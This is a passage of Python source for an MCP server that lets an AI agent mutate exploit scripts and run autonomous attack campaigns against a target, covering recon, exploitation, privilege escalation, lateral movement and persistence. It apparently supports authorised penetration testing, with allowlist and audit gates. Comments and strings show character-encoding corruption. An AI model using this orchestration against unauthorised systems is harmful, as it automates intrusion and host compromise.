            return "BLOCKED: adaptive_exploits is disabled in config.yaml."

        try:
            exploits_dir = workspace / "exploits"
            exploits_dir.mkdir(parents=True, exist_ok=True)

            # Look up script and sidecar
            script_path = exploits_dir / f"{script_id}.py"
            sidecar_path = exploits_dir / f"{script_id}.json"

            if not script_path.exists():
                return f"ERROR: Script '{script_id}.py' not found in {exploits_dir}."
            if not sidecar_path.exists():
                return f"ERROR: Sidecar metadata '{script_id}.json' not found in {exploits_dir}."

            script_text = script_path.read_text(encoding="utf-8")
            sidecar = json.loads(sidecar_path.read_text(encoding="utf-8"))

            # Reconstruct CraftedPayload
            previous_payload = CraftedPayload(
                generation_id=sidecar.get("generation_id", script_id),
                parent_id=sidecar.get("parent_id"),
                script=script_text,
                mutation_strategy=sidecar.get("mutation_strategy", "generate"),
                metadata=sidecar.get("metadata", {}),
                confidence=float(sidecar.get("confidence", 0.5)),
            )

            # Determine attempt number from lineage
            attempt_number = 1
            lineage_dir = exploits_dir
            current_id = script_id
            while current_id:
                sc_path = lineage_dir / f"{current_id}.json"
                if sc_path.exists():
                    try:
                        sc = json.loads(sc_path.read_text(encoding="utf-8"))
                        current_id = sc.get("parent_id", "")
                        if current_id:
                            attempt_number += 1
                        else:
                            break
                    except Exception:
                        break
                else:
                    break

            # Build experience store
            experience_store: ExperienceStore | None = None
            try:
                experience_store = ExperienceStore(get_default_db())
            except Exception:
                experience_store = None

            client, model_name = _get_model_client(config)
            max_mutations = int(adaptive_cfg.get("max_mutations", 5))

            mutator = ExploitMutator(
                workspace=exploits_dir,
                experience_store=experience_store,
                client=client,
                model=model_name,
                max_mutations=max_mutations,
            )

            mutated = mutator.mutate_on_failure(
                payload=previous_payload,
                failure_output=failure_output,
                attempt_number=attempt_number,
            )

            if mutated is None:
                return (
                    f"MUTATE_EXPLOIT_RESULT: max_mutations_reached\n"
                    f"SCRIPT_ID: {script_id}\n"
                    f"ATTEMPT: {attempt_number}\n"
                    f"MAX_MUTATIONS: {max_mutations}\n"
                    f"REASON: Exceeded maximum mutation attempts. Try a different approach or module."
                )

            # Save mutated script
            new_script_path = exploits_dir / f"{mutated.generation_id}.py"
            new_script_path.write_text(mutated.script, encoding="utf-8")

            # Save updated sidecar
            new_sidecar = {
                "generation_id": mutated.generation_id,
                "parent_id": mutated.parent_id,
                "mutation_strategy": mutated.mutation_strategy,
                "confidence": mutated.confidence,
                "metadata": mutated.metadata,
                "created_at": datetime.now(timezone.utc).isoformat(),
            }
            new_sidecar_path = exploits_dir / f"{mutated.generation_id}.json"
            new_sidecar_path.write_text(json.dumps(new_sidecar, indent=2, default=str), encoding="utf-8")

            lines = [
                "MUTATE_EXPLOIT_RESULT: mutated",
                f"GENERATION_ID: {mutated.generation_id}",
                f"PARENT_ID: {mutated.parent_id}",
                f"SCRIPT_PATH: {new_script_path}",
                f"SIDECAR_PATH: {new_sidecar_path}",
                f"CONFIDENCE: {mutated.confidence:.2f}",
                f"MUTATION_STRATEGY: {mutated.mutation_strategy}",
                f"ATTEMPT_NUMBER: {attempt_number}",
                "",
                "SCRIPT_PREVIEW (first 500 chars):",
                mutated.script[:500],
            ]
            return "\n".join(lines)
        except Exception as exc:
            return f"ERROR: Exploit mutation failed Ã¢â‚¬â€ {exc}"

    # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
    # 5. Autonomous Attack Orchestration (tools.autonomous_orchestrator)
    # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â

    @mcp.tool()
    @require_allowlist()
    async def start_autonomous_campaign(target_ip: str, goal: str = "initial_access", aggression_level: str = "normal") -> str:
        """Start a fully autonomous attack campaign against a target IP.

        Launches the AutonomousOrchestrator in a background daemon thread. The orchestrator
        runs the full kill chain: reconnaissance Ã¢â€ â€™ enumeration Ã¢â€ â€™ exploitation Ã¢â€ â€™
        privilege escalation Ã¢â€ â€™ lateral movement Ã¢â€ â€™ persistence. Campaign state is
        periodically saved to the workspace for monitoring via get_campaign_status.

        Args:
            target_ip: IPv4 address of the target host.
            goal: Campaign goal Ã¢â‚¬â€ 'initial_access', 'privilege_escalation', 'full_compromise',
                  or 'lateral_movement'.
            aggression_level: 'stealth', 'normal', 'aggressive', or 'maximum'.

        Returns:
            campaign_id, status 'started', and the campaign directory path.

        Example:
            start_autonomous_campaign("192.168.1.100", "full_compromise", "aggressive")
        """
        if not validate_target_or_ip(target_ip):
            return "ERROR: Invalid target (IP or domain)."

        # Check config gate
        swarm_cfg = (config or {}).get("swarm", {})
        if not swarm_cfg.get("enabled", True):
            return "BLOCKED: swarm is disabled in config.yaml."

        try:
            aggression_map: dict[str, AggressionLevel] = {
                "stealth": AggressionLevel.STEALTH,
                "normal": AggressionLevel.NORMAL,
                "aggressive": AggressionLevel.AGGRESSIVE,
                "maximum": AggressionLevel.MAXIMUM,
            }
            agg = aggression_map.get(aggression_level.lower(), AggressionLevel.NORMAL)

            campaign_id = f"campaign-{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}-{hashlib.sha256(target_ip.encode()).hexdigest()[:8]}"
            campaign_dir = workspace / "campaigns" / campaign_id
            campaign_dir.mkdir(parents=True, exist_ok=True)

            # Build mission config. The ``autonomous`` block (config.yaml) is
            # merged first so its opt-in Phase 2 flags (persistence_phase,
            # checkpoint_every, adaptive_replan, max_pivot_depth) reach the
            # orchestrator; the explicit keys below then override the shared
            # ones (target/goal/aggression/max_cycles/workspace).
            mission_config = {
                **(config or {}).get("autonomous", {}),
                # Phase 6.2: pass the opsec block through so the orchestrator's
                # AttackModuleExecutor can build an OpsecManager and make
                # AggressionLevel.STEALTH pacing load-bearing. Absent -> {} ->
                # disabled profile -> pacing no-op (legacy behavior).
                "opsec": (config or {}).get("opsec", {}),
                # Phase 3: pass the MSF auto-local_exploit_suggester flag through
                # so the privesc phase can dispatch the advisory follow-up.
                "msf_auto_les": (config or {}).get("exploit", {}).get("msf", {}).get("auto_local_exploit_suggester", False),
                # D1: pass the orchestrator.semantic_memory flag + ollama/embed
                # config through so the orchestrator can build its own
                # SemanticMemoryManager when no manager is supplied directly.
                # Default false (opt-in per the new-attack-path rule).
                "semantic_memory": bool((config or {}).get("orchestrator", {}).get("semantic_memory", False)),
                "ollama": (config or {}).get("ollama", {}),
                "embedding_model": (config or {}).get("memory", {}).get("embedding_model", "nomic-embed-text"),
                "target": target_ip,
                "goal": goal,
                "aggression": agg.value,
                "max_cycles": (config or {}).get("exploit", {}).get("max_rounds", 50),
                "max_aggression": agg.value,
                "workspace": str(campaign_dir),
            }

            orchestrator = AutonomousOrchestrator(
                mission_config=mission_config,
                workspace_root=campaign_dir,
            )

            # Domain targeting: when the operator passed a domain (not an IP)
            # to start_autonomous_campaign, resolve it and thread both the
            # original domain and the resolved IP into the orchestrator so
            # the Path-B subdomain-expansion branch in _phase_reconnaissance
            # fires. IP-only campaigns pass "" (unchanged behavior).
            _orig_target = ""
            _resolved_ip = ""
            if is_fqdn(target_ip):
                _orig_target = target_ip
                _resolved_ip = resolve_target_to_ip(target_ip) or ""

            # Write initial state
            state = orchestrator.get_state(target_ip)
            if _orig_target:
                state.original_target = _orig_target
            if _resolved_ip:
                state.resolved_ip = _resolved_ip
            state.aggression = agg
            state.add_timeline_event("campaign_start", f"Autonomous campaign started with goal: {goal}")

            initial_state = {
                "campaign_id": campaign_id,
                "target": target_ip,
                "goal": goal,
                "aggression": agg.value,
                "status": "started",
                "started_at": datetime.now(timezone.utc).isoformat(),
                "current_phase": state.current_phase.value,
                "tasks": {"completed": 0, "failed": 0, "pending": 0},
                "compromised_hosts": [],
                "last_error": "",
            }
            (campaign_dir / "state.json").write_text(
                json.dumps(initial_state, indent=2, default=str), encoding="utf-8"
            )

            # Launch in background asyncio task
            async def _run_campaign() -> None:
                try:
                    await orchestrator.run_autonomous_campaign(
                        [target_ip],
                        original_target=_orig_target,
                        resolved_ip=_resolved_ip,
                    )
                    # Save final state
                    final_state = {
                        "campaign_id": campaign_id,
                        "target": target_ip,
                        "goal": goal,
                        "aggression": agg.value,
                        "status": "completed",
                        "started_at": initial_state["started_at"],
                        "completed_at": datetime.now(timezone.utc).isoformat(),
                        "current_phase": state.current_phase.value,
                        "tasks": {
                            "completed": sum(1 for t in orchestrator._tasks.values() if t.status == TaskStatus.COMPLETED),
                            "failed": sum(1 for t in orchestrator._tasks.values() if t.status == TaskStatus.FAILED),
                            "pending": sum(1 for t in orchestrator._tasks.values() if t.status == TaskStatus.PENDING),
                        },
                        "compromised_hosts": state.successful_exploits,
                        "last_error": "",
                    }
                    (campaign_dir / "state.json").write_text(
                        json.dumps(final_state, indent=2, default=str), encoding="utf-8"
                    )
                except Exception as exc:
                    error_state = {
                        "campaign_id": campaign_id,
                        "target": target_ip,
                        "goal": goal,
                        "aggression": agg.value,
                        "status": "error",
                        "started_at": initial_state["started_at"],
                        "completed_at": datetime.now(timezone.utc).isoformat(),
                        "current_phase": state.current_phase.value if state else "unknown",
                        "tasks": {"completed": 0, "failed": 0, "pending": 0},
                        "compromised_hosts": [],
                        "last_error": str(exc),
                    }
                    (campaign_dir / "state.json").write_text(
                        json.dumps(error_state, indent=2, default=str), encoding="utf-8"
                    )

            _bg_task = asyncio.create_task(_run_campaign())
            _running_campaign_tasks.add(_bg_task)
            _campaign_orchestrators[campaign_id] = orchestrator

            def _on_done(task: asyncio.Task) -> None:
                _running_campaign_tasks.discard(task)
                _campaign_orchestrators.pop(campaign_id, None)

            _bg_task.add_done_callback(_on_done)

            lines = [
                f"CAMPAIGN_STARTED: {campaign_id}",
                f"TARGET: {target_ip}",
                f"GOAL: {goal}",
                f"AGGRESSION: {agg.value}",
                "STATUS: started",
                f"CAMPAIGN_DIR: {campaign_dir}",
                f"STATE_FILE: {campaign_dir / 'state.json'}",
                "",
                "NOTE: Campaign is running in background. Use get_campaign_status to monitor progress.",
            ]
            return "\n".join(lines)
        except Exception as exc:
            return f"ERROR: Campaign start failed Ã¢â‚¬â€ {exc}"

    @mcp.tool()
    @audit_tool
    def get_campaign_status(campaign_id: str) -> str:
        """Get the current status of a running or completed autonomous campaign.

        Reads the campaign's state.json file and returns the current attack phase,
        task counts, compromised hosts, and any errors.

        Args:
            campaign_id: The campaign ID returned by start_autonomous_campaign.

        Returns:
            Current AttackPhase, number of completed/failed/pending tasks, current target,
            compromised hosts, and last error if applicable.

        Example:
            get_campaign_status("campaign-20260504_120000-abc12345")
        """
        if not campaign_id or not campaign_id.strip():
            return "ERROR: campaign_id is required."

        try:
            state_path = workspace / "campaigns" / campaign_id / "state.json"
            if not state_path.exists():
                return f"ERROR: Campaign '{campaign_id}' not found. Check the campaign_id or workspace path."

            state_data = json.loads(state_path.read_text(encoding="utf-8"))

            lines = [
                f"CAMPAIGN_STATUS: {campaign_id}",
                f"TARGET: {state_data.get('target', 'unknown')}",
                f"GOAL: {state_data.get('goal', 'unknown')}",
                f"STATUS: {state_data.get('status', 'unknown')}",
                f"AGGRESSION: {state_data.get('aggression', 'unknown')}",
                f"CURRENT_PHASE: {state_data.get('current_phase', 'unknown')}",
                f"STARTED_AT: {state_data.get('started_at', 'unknown')}",
                f"COMPLETED_AT: {state_data.get('completed_at', 'N/A (running)')}",
                "",
                "TASKS:",
            ]
            tasks = state_data.get("tasks", {})
            lines.append(f"  Completed: {tasks.get('completed', 0)}")
            lines.append(f"  Failed: {tasks.get('failed', 0)}")
            lines.append(f"  Pending: {tasks.get('pending', 0)}")

            compromised = state_data.get("compromised_hosts", [])
            if compromised:
                lines.append(f"\nCOMPROMISED: {', '.join(compromised)}")
            else:
                lines.append("\nCOMPROMISED: None yet")

            last_error = state_data.get("last_error", "")
            if last_error:
                lines.append(f"\nLAST_ERROR: {last_error}")

            return "\n".join(lines)
        except Exception as exc:
            return f"ERROR: Status retrieval failed Ã¢â‚¬â€ {exc}"

    @mcp.tool()
    @audit_tool
    async def run_campaign_step(campaign_id: str) -> str:
        """Execute a single pending task from an autonomous campaign synchronously.

        For step-by-step control: loads the orchestrator state, executes one pending
        task, updates state.json, and returns the task result. Useful for debugging
        or when you want to manually control campaign pacing.

        Args:
            campaign_id: The campaign ID returned by start_autonomous_campaign.

        Returns:
            Task result: module used, target, success/failure, and output summary.

        Example:
            run_campaign_step("campaign-20260504_120000-abc12345")
        """
        if not campaign_id or not campaign_id.strip():
            return "ERROR: campaign_id is required."

        try:
            campaign_dir = workspace / "campaigns" / campaign_id
            state_path = campaign_dir / "state.json"
            if not state_path.exists():
                return f"ERROR: Campaign '{campaign_id}' not found."

            state_data = json.loads(state_path.read_text(encoding="utf-8"))
            target_ip = state_data.get("target", "")
            if not target_ip:
                return "ERROR: No target found in campaign state."

            # Target-IP lock: target_ip comes from a workspace state.json that
            # is LLM-writable, so re-check it against the allowlist before running
            # recon / attack modules -- mirrors the @require_allowlist gate that
            # start_autonomous_campaign applies to its target_ip argument. The
            # audit_tool decorator above records this call (and a BLOCKED result
            # is logged as approved=False, status=blocked).
            allowed, reason = check_targets_allowlist([target_ip], config)
            if not allowed:
                return (
                    f"CAMPAIGN_STEP_RESULT: blocked\n"
                    f"TARGET: {target_ip}\n"
                    f"BLOCKED_REASON: {reason}"
                )

            # Build orchestrator and load state. Merge the ``autonomous``
            # config block so the opt-in Phase 2 flags flow through; explicit
            # keys below override (max_cycles=1 -- run_campaign_step is a
            # single step).
            mission_config = {
                **(config or {}).get("autonomous", {}),
                # Phase 6.2: pass the opsec block through so the orchestrator's
                # AttackModuleExecutor can build an OpsecManager and make
                # AggressionLevel.STEALTH pacing load-bearing. Absent -> {} ->
                # disabled profile -> pacing no-op (legacy behavior).
                "opsec": (config or {}).get("opsec", {}),
                # Phase 3: pass the MSF auto-local_exploit_suggester flag through.
                "msf_auto_les": (config or {}).get("exploit", {}).get("msf", {}).get("auto_local_exploit_suggester", False),
                # D1: pass the orchestrator.semantic_memory flag + ollama/embed
                # config through so the orchestrator can build its own
                # SemanticMemoryManager when no manager is supplied directly.
                "semantic_memory": bool((config or {}).get("orchestrator", {}).get("semantic_memory", False)),
                "ollama": (config or {}).get("ollama", {}),
                "embedding_model": (config or {}).get("memory", {}).get("embedding_model", "nomic-embed-text"),
                "target": target_ip,
                "goal": state_data.get("goal", "initial_access"),
                "max_cycles": 1,
                "max_aggression": state_data.get("aggression", "normal"),
                "workspace": str(campaign_dir),
            }

            orchestrator = AutonomousOrchestrator(
                mission_config=mission_config,
                workspace_root=campaign_dir,
            )

            state = orchestrator.get_state(target_ip)
            # Domain targeting: restore the domain context on a step-resumed
            # campaign so state.original_target is populated (the subdomain-
            # expansion branch in _phase_reconnaissance reads it). The
            # state.json written by start_autonomous_campaign carries the
            # original target string; if it's a domain, thread it through.
            _step_orig = state_data.get("original_target", "") or ""
            _step_resolved = state_data.get("resolved_ip", "") or ""
            if _step_orig and not state.original_target:
                state.original_target = _step_orig
            if _step_resolved and not state.resolved_ip:
                state.resolved_ip = _step_resolved

            # Run just the recon phase if no recon yet, otherwise try exploitation
            if state.recon_result is None:
                recon_config = ReconConfig()
                pipeline = ReconPipeline(recon_config)
                recon_result = await pipeline.recon_host(target_ip)
                state.recon_result = recon_result
                state.current_phase = OrchAttackPhase.ENUMERATION

                # Update state
                state_data["current_phase"] = state.current_phase.value
                state_data["status"] = "running"
                (campaign_dir / "state.json").write_text(
                    json.dumps(state_data, indent=2, default=str), encoding="utf-8"
                )

                return (
                    f"CAMPAIGN_STEP_RESULT: recon_completed\n"
                    f"TARGET: {target_ip}\n"
                    f"OPEN_PORTS: {len(recon_result.open_ports)} Ã¢â‚¬â€ {recon_result.open_ports}\n"
                    f"SERVICES: {', '.join(s.service for s in recon_result.services)}\n"
                    f"NEXT_PHASE: enumeration"
                )

            # Try to run the highest-scoring applicable module
            ctx = ModuleContext(
                target_ip=target_ip,
                target_os=state.recon_result.os_family if state.recon_result else None,
                services=[
                    {"service": s.service, "port": f"{s.port}/{s.protocol}"}
                    for s in (state.recon_result.services if state.recon_result else [])
                ],
            )

            from tools.attack_modules import find_modules
            scored = find_modules(ctx)
            if not scored:
                state_data["status"] = "completed"
                state_data["current_phase"] = "done"
                (campaign_dir / "state.json").write_text(
                    json.dumps(state_data, indent=2, default=str), encoding="utf-8"
                )
                return (
                    f"CAMPAIGN_STEP_RESULT: no_applicable_modules\n"
                    f"TARGET: {target_ip}\n"
                    f"REASON: No attack modules match the current target context."
                )

            best_score, best_module = scored[0]
            result = best_module.run(ctx)

            # Update state
            tasks = state_data.get("tasks", {})
            if result.get("status") in ("success", "exploited", "script_generated"):
                tasks["completed"] = tasks.get("completed", 0) + 1
                state.successful_exploits.append(best_module.name)
                state_data["compromised_hosts"] = state.successful_exploits
            else:
                tasks["failed"] = tasks.get("failed", 0) + 1

            state_data["tasks"] = tasks
            state_data["current_phase"] = "exploit"
            (campaign_dir / "state.json").write_text(
                json.dumps(state_data, indent=2, default=str), encoding="utf-8"
            )

            lines = [
                "CAMPAIGN_STEP_RESULT: executed",
                f"MODULE: {best_module.name}",
                f"TARGET: {target_ip}",
                f"APPLICABILITY_SCORE: {best_score}",
                f"STATUS: {result.get('status', 'unknown')}",
            ]
            if result.get("note"):
                lines.append(f"NOTE: {result['note']}")
            if result.get("script"):
                lines.append(f"SCRIPT_PREVIEW:\n{result['script'][:300]}")

            return "\n".join(lines)
        except Exception as exc:
            return f"ERROR: Campaign step failed Ã¢â‚¬â€ {exc}"

    # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
    @mcp.tool()
    @audit_tool
    def stop_campaign(campaign_id: str) -> str:
        """Gracefully stop a running autonomous campaign.

        Signals the live AutonomousOrchestrator (if still running) to stop at its
        next cycle boundary. The campaign's state.json is left intact so its final
        status can still be read via get_campaign_status.

        Args:
            campaign_id: The campaign ID returned by start_autonomous_campaign.

        Returns:
            Status string indicating whether the campaign was signalled to stop,
            had already finished, or was not found.

        Example:
            stop_campaign("campaign-20260504_120000-abc12345")
        """
        if not campaign_id or not campaign_id.strip():
            return "ERROR: campaign_id is required."

        orchestrator = _campaign_orchestrators.get(campaign_id)
        if orchestrator is None:
            state_path = workspace / "campaigns" / campaign_id / "state.json"
            if state_path.exists():
                return f"STOPPED: Campaign '{campaign_id}' is not running (already finished)."
            return f"ERROR: Campaign '{campaign_id}' not found."

        orchestrator.stop()
        return f"STOPPED: Campaign '{campaign_id}' stop signal sent."

    # 6. Persistent Interactive Sessions (tools.persistent_session_manager)
    # Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â



